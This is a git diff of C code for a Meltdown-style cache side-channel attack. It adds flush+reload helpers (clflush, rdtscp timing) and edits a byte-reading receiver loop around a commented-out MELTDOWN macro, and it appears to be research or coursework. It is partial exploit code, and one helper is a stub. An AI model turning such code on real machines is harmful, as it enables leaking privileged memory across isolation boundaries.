@@ -15,6 +15,7 @@
 
 #define DEBUG 1
 #define RETRIES 1000
+#define THRESHOLD 90
 
 // Downside of this implementation, can't read 0 values 
 #define MELTDOWN(addr) \
@@ -25,6 +26,24 @@
       :						\
       : "c"(addr), "b"(rec)			\
       : "rax");
+
+
+/*
+Helper functions 
+ */
+static inline void maccess(void *p) {
+  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
+}
+
+static void flush(void *p) {
+  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+}
+
+// measures access time, if hit return 1 else return 0;
+static inline int flush_reload(void *p) {
+  return 0;
+}
+
 
 /*
   Global vars 
@@ -62,8 +81,11 @@ int __attribute__((always_inline)) read_byte_from_reciever() {
     // timing
     int* addr = &rec[mix_i * 4096];
     int start = __rdtscp(&junk);
-    junk = *addr;
+    maccess((void*)addr); 
     int elapsed = __rdtscp(&junk) - start;
+
+    // flush it 
+    flush(addr);
     
     // check time 
     if(elapsed < min_value) {
@@ -72,10 +94,6 @@ int __attribute__((always_inline)) read_byte_from_reciever() {
     }
   }
 
-  // flush
-  for(int i = 0; i < 256; i++)
-    _mm_clflush(&rec[i * 4096]);
-  
   return min_idx;
 }
 
@@ -95,7 +113,8 @@ char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
       // meltdown attack into cache 
       //MELTDOWN(addr);
 
-      volatile int junk = rec[60 * 4096];
+      volatile int* p = &rec[60 * 4096];
+      maccess((void*)p); 
             
       // recieve 
       int value = read_byte_from_reciever(addr);
@@ -108,9 +127,6 @@ char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
     int max = 0;
     int max_idx = -1;
     for(int j = 0; j < 256; j++) {
-#if DEBUG
-      INFO("%d %d\n", j, hit[j]);
-#endif 
       if(hit[j] > max) {
 	max = hit[j];
 	max_idx = j;
